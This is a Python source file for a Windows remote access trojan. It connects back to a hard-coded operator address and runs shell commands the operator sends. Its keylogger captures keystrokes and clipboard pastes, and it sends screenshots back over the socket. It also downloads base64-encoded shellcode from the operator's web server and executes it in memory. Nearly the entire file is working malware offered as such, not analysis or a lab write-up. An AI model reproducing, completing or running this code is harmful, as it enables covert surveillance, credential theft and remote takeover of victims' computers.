import socket
import subprocess
import os
import time
import win32api
import win32con
import win32gui
import win32ui
from ctypes import byref, create_string_buffer, c_ulong, windll
import pythoncom
import pyWinhook as pyHook
import sys
import win32clipboard
from urllib.error import URLError
from urllib import request
import base64
import ctypes
from io import StringIO
import threading

IP = '192.168.0.115'
PORT = 443
EOF_MARKER = b'--EOF--'
TIMEOUT = 60
kernel32 = ctypes.windll.kernel32

class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeError as e:
            print(f'{e}: window name unknown')

        print('\n', process_id, executable.value.decode(), self.current_window)

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        if event.WindowName != self.current_window:
            self.get_current_process()
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'\n{event.Key}')
        return True

def run_keylogger():
    print("[*] In keylog module")
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    kl = KeyLogger()
    hm = pyHook.HookManager()
    hm.KeyDown = kl.mykeystroke
    hm.HookKeyboard()

    start_time = time.time()
    while time.time() - start_time < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    log = sys.stdout.getvalue()
    sys.stdout = save_stdout

    with open('key.txt', 'w') as f:
        f.write(log)
    
    # Apagar o arquivo após enviar
    os.remove('key.txt')

    return log

def get_shellcode(url):
    while True:
        try:
            with request.urlopen(url) as response:
                shellcode = base64.decodebytes(response.read())
            return shellcode
        except URLError:
            time.sleep(5)

def run_shellcode(shellcode):
    def execute_shellcode():
        buffer = ctypes.create_string_buffer(shellcode)
        length = len(shellcode)

        kernel32.VirtualAlloc.restype = ctypes.c_void_p
        kernel32.RtlMoveMemory.argtypes = (
                ctypes.c_void_p,
                ctypes.c_void_p,
                ctypes.c_size_t)

        ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
        kernel32.RtlMoveMemory(ptr, buffer, length)

        shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
        shell_func()

    thread = threading.Thread(target=execute_shellcode)
    thread.start()

def connect(IP, PORT):
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((IP, PORT))
            return client
        except Exception as error:
            print(f"Connection failed: {error}")
            time.sleep(3)

def get_dimensions():
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    return width, height, left, top

def screenshot(name='screenshot'):
    hdesktop = win32gui.GetDesktopWindow()
    width, height, left, top = get_dimensions()

    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()

    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

    screenshot.SaveBitmapFile(mem_dc, f'{name}.bmp')

    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

def take_screenshot(client):
    screenshot()
    with open('screenshot.bmp', 'rb') as f:
        img = f.read()
    client.sendall(img)
    client.sendall(EOF_MARKER)
    
    # Apagar o arquivo após enviar
    os.remove('screenshot.bmp')

def handle_command(client, data):
    try:
        if data.startswith("cd "):
            new_dir = data[3:].strip()
            try:
                os.chdir(new_dir)
                client.sendall(f"Changed directory to {new_dir}\n".encode('utf-8'))
            except FileNotFoundError:
                client.sendall(f"Directory {new_dir} not found.\n".encode('utf-8'))
        elif data == 'screenshot':
            take_screenshot(client)
        elif data == 'keylog':
            log = run_keylogger()
            client.sendall(log.encode('utf-8'))
            client.sendall(EOF_MARKER)
        elif data == 'run_shellcode':
            url = "http://192.168.0.115:8000/shellcode.bin"  # Substitua pela URL correta
            shellcode = get_shellcode(url)
            run_shellcode(shellcode)
            client.sendall("Shellcode executed successfully.".encode('utf-8'))
        else:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output, error = proc.communicate()
            client.sendall(output)
            client.sendall(error)
    except Exception as e:
        client.sendall(str(e).encode('utf-8'))

def listen(client):
    try:
        while True:
            data = client.recv(1024).decode('utf-8').strip()
            if data == '/exit':
                client.close()
                return
            handle_command(client, data)
    except Exception as e:
        print(f"Error in listen: {e}")

if __name__ == '__main__':
    while True:
        client = connect(IP, PORT)
        if client:
            listen(client)
            break
        else:
            time.sleep(3)
